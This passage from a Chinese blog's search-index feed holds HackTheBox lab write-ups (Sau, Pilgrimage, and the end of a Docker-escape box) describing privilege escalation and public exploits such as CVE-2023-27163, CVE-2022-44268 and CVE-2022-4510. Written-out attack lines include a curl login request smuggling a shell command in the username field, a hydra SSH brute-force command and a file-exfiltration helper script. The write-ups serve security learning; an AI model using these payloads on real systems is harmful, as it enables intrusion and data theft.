逃逸</h4><p>登录MySQL成功，本来想在mysql.user里面查信息的，结果Password这一列直接被删。于是转战cacti</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_H3B7f1i3PQ.png" alt=""></p><p>使用john爆破一下，得出明文密码</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_MBtQQHdVmg.png" alt=""></p><p>拿下User Flag</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_xhl4G00v7d.png" alt=""></p><h3 id="Get-Root-Flag"><a href="#Get-Root-Flag" class="headerlink" title="Get Root Flag"></a>Get Root Flag</h3><p>SUID和sudo看了一下是没有了，直接上linpeas再查查</p><p>倒是发现了个at提权漏洞</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ggdaCi7uMz.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_gMjX2tx9ck.png" alt=""></p><p>结果环境里就没有安装gcc…</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_E2jbbHVlqA.png" alt=""></p><p>又在linpeas里面翻了很久，根据里面的信息可以察觉到这里和CACTI（上面那个Shell）应该是两个机器，根据进程信息可以判断这边应该跑着Docker，CACTI可能就是个容器</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Wz-LAKfkiI.png" alt=""></p><p>于是查一下Docker版本看看有没有nday</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_s1KagKh6AJ.png" alt=""></p><p>还真有，该漏洞允许非特权Linux用户访问和运行容器内的程序。</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7P_NAmATET.png" alt=""></p><p>找到EXP直接开冲：<a href="https://github.com/UncleJ4ck/CVE-2021-41091" title="https://github.com/UncleJ4ck/CVE-2021-41091">https://github.com/UncleJ4ck/CVE-2021-41091</a></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_8VoeEON5zC.png" alt=""></p><p>但是跑完之后还是没成功嘛，认真看一下，我们需要先在容器内给<code>/bin/bash</code> 加上SUID</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_aQYhSIoU6I.png" alt=""></p><p>又回到CACTI里面提权，SUID这里发现了<code>capsh</code>可以进行提权</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_dRVimB8E8u.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_CiVOFKRHht.png" alt=""></p><p>再回去试试</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_zL_9eQzyj8.png" alt=""></p><p>拿下！这台靶机，开局直接送个Shell，我还在想这也太简单了。结果是个Container环境，还得Docker逃逸，整体还是挺有收获的</p>]]></content>
    
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Sau - HackTheBox</title>
    <link href="/2023/07/15/Sau-HackTheBox/"/>
    <url>/2023/07/15/Sau-HackTheBox/</url>
    
    <content type="html"><![CDATA[<p>开局先扫一下，发现只有22和55555端口可以访问</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_VAkKigqcJ4.png" alt=""></p><p>进去直接看到开源项目了都</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_xP0f5_NGN8.png" alt=""></p><p>看介绍这是一个收集HTTP请求并且可以展示和检阅它们的一个简单的Web服务</p><p>看开源项目的时候留意到最新的Release已经是v1.2.3了，按照HackTheBox的套路，一般都是nday（听大佬说的）所以Google查一下有没有可利用的nday</p><p>果然Google一查就有了（CVE-2023-27163）</p><h3 id="GetShell-过程"><a href="#GetShell-过程" class="headerlink" title="GetShell 过程"></a>GetShell 过程</h3><h4 id="CVE-2023-27163"><a href="#CVE-2023-27163" class="headerlink" title="CVE-2023-27163"></a>CVE-2023-27163</h4><p>研究一下找到的POC：<a href="https://github.com/entr0pie/CVE-2023-27163" title="https://github.com/entr0pie/CVE-2023-27163">https://github.com/entr0pie/CVE-2023-27163</a></p><p>这是一个SSRF漏洞，通过这个脚本就能简单的利用</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_BKNxZ6ZdaA.png" alt=""></p><p>我也试一下，确实是可以的</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_G3MypS21zZ.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_b4GizETLLm.png" alt=""></p><p>成功了但这样跑POC好像没啥用，还不知道漏洞详细情况，于是找到了关于这个漏洞更详细的介绍：</p><p><a href="https://notes.sjtu.edu.cn/s/MUUhEymt7#" title="https://notes.sjtu.edu.cn/s/MUUhEymt7#">https://notes.sjtu.edu.cn/s/MUUhEymt7#</a></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_CAbd47AZjs.png" alt=""></p><p>原来就是这个forward_url存在漏洞，根据文章提示，创建完Baskets之后要访问一下才能触发</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_sDuk0s9XMi.png" alt=""></p><p>我也试试看</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_9w8v6vXA6N.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_OkJ7I-RTya.png" alt=""></p><p>成功了，但还是不知道能干啥，不过可以发现这里的HTTP Request信息是我的本地浏览器的</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_X8-5u6xQNS.png" alt=""></p><p>这里想破脑袋也找了很多文章，都没找到SSRF无回显在这种情况下有什么用。但是上面的nc监听的消息里发现，其实它会来GET我指定的内容。回想起端口扫描的时候filtered的80和8338端口，我们能不能让服务器去GET这些内容呢？</p><p>这里指定<code>forward_url</code>为<code>127.0.0.1:80</code></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_57fdSqqUTc.png" alt=""></p><p>结果还是没用…</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-YgCXLeHOx.png" alt=""></p><p>留意到<code>&quot;proxy_response&quot;: false</code> 试了一下改成<code>true</code>行不行</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_efG6PM5KOq.png" alt=""></p><p>逆天…还真就行了</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_2naG2hEYyk.png" alt=""></p><p>访问一下发现也是个项目，老规矩搜一下nday</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_SnDN41b2J0.png" alt=""></p><h4 id="Maltrail-RCE"><a href="#Maltrail-RCE" class="headerlink" title="Maltrail RCE"></a>Maltrail RCE</h4><p>这东西没有申请CVE，exploitdb搜不到，不过Google查到了</p><p><a href="https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/" title="https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/">https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/</a></p><p>文章里表示这样就能执行命令了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&#x27;http://hostname:8338/login&#x27;</span> \<br>  --data <span class="hljs-string">&#x27;username=;`id &gt; /tmp/bbq`&#x27;</span><br></code></pre></td></tr></table></figure><p>结合上面的测试，这个服务会把我们的HTTP Request带过去，正好可以通过SSRF打</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-n4kYto8Q7.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_2TA0Pwcolb.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_2OZHx8W2HL.png" alt=""></p><h3 id="提权过程"><a href="#提权过程" class="headerlink" title="提权过程"></a>提权过程</h3><p>puma用户可以免密使用sudo执行 <code>/usr/bin/systemctl</code></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ccYEP8L9x_.png" alt=""></p><p>根据CTFOBins的指示，我们可以滥用sudo权限提权至root</p><p><a href="https://gtfobins.github.io/gtfobins/systemctl/" title="https://gtfobins.github.io/gtfobins/systemctl/">https://gtfobins.github.io/gtfobins/systemctl/</a></p><p>这里先搞个bash好操作一些</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ script /dev/null /bin/bash<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_mTATfJvJ7l.png" alt=""></p><p>拿下！但是感觉SSRF那里真的有点需要脑洞了，不太友好。提权部分还挺简单。</p>]]></content>
    
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pilgrimage - HackTheBox</title>
    <link href="/2023/07/15/Pilgrimage-HackTheBox/"/>
    <url>/2023/07/15/Pilgrimage-HackTheBox/</url>
    
    <content type="html"><![CDATA[<p>Noob 的 HackTheBox 之旅</p><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>VPS：43.134.44.115</p><p>Mac：localhost</p><p>Burpsuite</p><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><ol><li>VPS通过OpenVPN连接HacktheBox</li><li>Mac通过端口转发将7080端口转发到VPS<br><code>ssh -qTfnN -D 7080 user@43.134.44.115</code></li><li>浏览器通过Burpsuite 将数据代理到7080端口</li></ol><p>这样就可以在本地的浏览器上通过Burpsuite流畅的测HacktheBox的靶机了</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2017.40.38_0Z6PAL7BFH.png" alt=""></p><h3 id="getShell过程"><a href="#getShell过程" class="headerlink" title="getShell过程"></a>getShell过程</h3><p>先体验一下功能，从PHPSESSID看后端语言应该是PHP</p><h4 id="上传功能"><a href="#上传功能" class="headerlink" title="上传功能"></a>上传功能</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2017.47.17_kohrftGCRO.png" alt=""></p><p>试了一下就算上传PHP后缀也会被处理成jpeg文件</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2017.48.22_uiGRMegOtP.png" alt=""></p><h4 id="登录注册功能"><a href="#登录注册功能" class="headerlink" title="登录注册功能"></a>登录注册功能</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2017.51.25_Y2DHrHU3jp.png" alt=""></p><h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2017.52.38_j7X0NQnfse.png" alt=""></p><p>发现git泄漏，使用GitHack下载项目代码</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2017.54.49_jdE_HMMt8T.png" alt=""></p><h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p>打包代码下载到本地进行代码审计</p><p><code>tar -zcvf pilgrimage.zip pilgrimage.htb</code></p><p>登录和注册功能两个参数都使用了预编译，注入无望</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2019.22.33_ptkVK9pfwc.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2019.23.08_mT42LgcO03.png" alt=""></p><p>上传功能这里使用了magick去处理图片，并且会将后缀名设置成jpeg和png。上传无望</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2019.26.17__e5mG9nXJ_.png" alt=""></p><p>imagemagick这东西之前有著名的RCE漏洞，而且git泄漏这里还有magick这个文件。这里会不会存在nday呢</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2019.33.59_lpO2xVC0d1.png" alt=""></p><p>通过执行命令查到版本号，我们可以去exploitdb查一下有没有可利用的nday</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_guPmAiygOf.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2019.43.08_FWb7QWQS85.png" alt=""></p><p>有个任意文件读取可以用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs 纯文本"># Exploit Title: ImageMagick  7.1.0-49 - Arbitrary File Read<br># Google Dork: N/A<br># Date: 06/02/2023<br># Exploit Author: Cristian &#x27;void&#x27; Giustini<br># Vendor Homepage: https://imagemagick.org/<br># Software Link: https://imagemagick.org/<br># Version: &lt;= 7.1.0-49<br># Tested on: 7.1.0-49 and 6.9.11-60<br># CVE : CVE-2022-44268 (CVE Owner: Metabase Q Team<br>https://www.metabaseq.com/imagemagick-zero-days/)<br># Exploit pre-requirements: Rust<br><br><br># PoC : https://github.com/voidz0r/CVE-2022-44268<br></code></pre></td></tr></table></figure><h4 id="CVE-2022-44268"><a href="#CVE-2022-44268" class="headerlink" title="CVE-2022-44268"></a>CVE-2022-44268</h4><p>研究下POC的用法：</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2019.47.01_l39CB6Z4lT.png" alt=""></p><p>先通过项目给的工具指定要读取的文件，然后将生成image.png交给imageMagick处理，这一步交给存在漏洞的Web服务器去触发漏洞读取指定文件，然后将图片下载回来使用identify输出读取到的文件内容</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7Ty3jJ8z8q.png" alt=""></p><p><code>identify -verbose oout.png</code></p><p>输出读取到的内容</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_oag5we8Y1F.png" alt=""></p><p>这里就获取到了 /etc/passwd 文件内容</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_My0Ds4YEh3.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_x5M4BI1MNE.png" alt=""></p><p>只有emily和root用户是可以登录到bash的</p><p>这里想到尝试一下爆破，直接爆破root应该不可能，但可以试一下emily</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l emily -P /usr/share/wordlists/SecLists/Passwords/xato-net-10-million-passwords-10000.txt ssh://10.10.11.219 -t 4<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_EI3NuikA9X.png" alt=""></p><p>然后发现好像不太适合，爆破速度特别慢。想了一下公共靶机应该也不希望用户一起爆破</p><p>那还是回到任意文件读取这个漏洞吧</p><p>写个脚本简化流程，研究了一下identify命令。如果只需要Raw profile type部分的内容，需要执行：</p><p><code>identify  -format &quot;%[Raw profile type]&quot; -verbose oout.png</code></p><p>链接：<a href="https://www.imagemagick.org/script/escape.php" title="https://www.imagemagick.org/script/escape.php">https://www.imagemagick.org/script/escape.php</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">import sys<br>import requests<br>import subprocess<br><br>def run_identify(image_path):<br>    <span class="hljs-built_in">command</span> = [<span class="hljs-string">&#x27;identify&#x27;</span>, <span class="hljs-string">&#x27;-format&#x27;</span>, <span class="hljs-string">&#x27;%[Raw profile type]&#x27;</span>, <span class="hljs-string">&#x27;-verbose&#x27;</span>, image_path]<br>    <br>    try:<br>        output = subprocess.check_output(<span class="hljs-built_in">command</span>, stderr=subprocess.STDOUT, universal_newlines=True)<br>        <span class="hljs-comment">#这里[10:-8]是为了除去1473和verbose等无效数据</span><br>        <span class="hljs-built_in">print</span>(bytes.fromhex(output[10:]))<br>    <br>    except subprocess.CalledProcessError as e:<br>        <span class="hljs-built_in">print</span>(e.output)<br><br>def download_image(url, path):<br>    try:<br>        response = requests.get(url)<br>        response.raise_for_status()<br>        with open(path, <span class="hljs-string">&#x27;wb&#x27;</span>) as file:<br>            file.write(response.content)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;图片下载成功&#x27;</span>)<br>    except requests.exceptions.RequestException as e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;图片下载失败:&#x27;</span>, str(e))<br><br><br><br><span class="hljs-keyword">if</span> len(sys.argv) &lt; 2:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;请提供图片路径作为参数&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    image_path = sys.argv[1]<br>    url = sys.argv[2]<br>    download_image(url, image_path)<br>    run_identify(image_path)<br></code></pre></td></tr></table></figure><p>但这里又不知道应该读哪些文件好了，想了挺久会想起Web服务用的是sqlite的数据库。我们可以把sqlite数据库文件读取，看看数据里面能不能发现什么</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_CRWqLejbJU.png" alt=""></p><p>下载数据库文件</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_BV8rRtBuYs.png" alt=""></p><p>用命令将文件保存后处理一下，主要是删除无用字符（b’）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">python identify.py out.png http://pilgrimage.htb/shrunk/64b1faf7e3216.png &gt; sqli.db<br><span class="hljs-comment"># 从16进制转为二进制文件</span><br><span class="hljs-built_in">cat</span> sqli.db | xxd -r -p &gt; sqlite.db<br><br>-r 表示要进行逆向转换，从十六进制转换为二进制<br>-p 表示输入的十六进制数据是连续的，没有空格或其他字符分隔<br><br></code></pre></td></tr></table></figure><p>学习一下sqlite命令：<a href="https://www.runoob.com/sqlite/sqlite-commands.html" title="https://www.runoob.com/sqlite/sqlite-commands.html">https://www.runoob.com/sqlite/sqlite-commands.html</a></p><p>从数据库中可以查到用户emily和密码，emily之前在 /etc/passwd文件里见到过了，我直接ssh</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_iTfAwExvk4.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_BBjGnqlCT8.png" alt=""></p><p>登录成功，是个普通用户，拿到了user.txt 中的user flag。下一步提权</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Nhu_Ax6Ay2.png" alt=""></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>内核很新，sudo和SUID也没发现可利用的</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Zfg4pZC7_X.png" alt=""></p><p>直接上提权脚本看看，先看看查CVE的linux-exploit-suggester。对比一下内核版本，没一个靠谱的…</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_HM0wzNqmPf.png" alt=""></p><p>再看看PEASS，这个脚本集成了非常多Linux提权脚本</p><p>在观察进程的时候发现root运行了malwarescan.sh脚本</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_TNR96o0YdF.png" alt=""></p><p>看看脚本里都是什么内容：</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_21Q1F8iW4m.png" alt=""></p><p>通过inotifywait创建了一个关于<code>/var/www/pilgrimage.htb/shrunk/</code> 的监控，使用binwalk提取文件内容。看起来像是个简单的WAF，不允许文件内存在blacklist中的字符串</p><p>binwalk也有个著名的RCE漏洞（CVE-2022-4510），看看版本正好可以使用，美滋滋</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_zd12AgkHVi.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_MtbG9AW8TR.png" alt=""></p><p>输入参数运行脚本，就会生成binwalk_exploit.png，再上传到<code>var/www/pilgrimage.htb/shrunk/</code>目录让root运行binwalk触发即可</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ttjUd88fZV.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_z2qffOyWtE.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_YSwZYSA_-S.png" alt=""></p><p>拿下！从Noob进化成Script Kiddie</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image__V0QBNzAgu.png" alt=""></p>]]></content>
    
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Remake</title>
    <link href="/2023/07/13/Remake/"/>
    <url>/2023/07/13/Remake/</url>
    
    <content type="html"><![CDATA[<p>Remake…</p>]]></content>
    
    
    
    <tags>
      
      <tag>Remake</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
